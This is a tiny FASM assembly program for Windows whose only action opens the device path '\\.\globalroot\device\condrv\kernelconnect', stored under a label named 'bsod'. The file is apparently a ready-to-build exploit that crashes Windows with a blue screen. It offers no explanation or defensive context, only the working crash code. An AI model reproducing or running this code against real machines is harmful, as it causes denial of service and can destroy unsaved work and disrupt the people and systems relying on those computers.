format PE GUI
entry main

include "win32a.inc"

bsod    db      "\\.\globalroot\device\condrv\kernelconnect", 0

main:
        invoke  CreateFile, bsod, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0

data import

        library kernel32,       "kernel32.dll"

        import  kernel32,\
                CreateFile,     "CreateFileA"

end data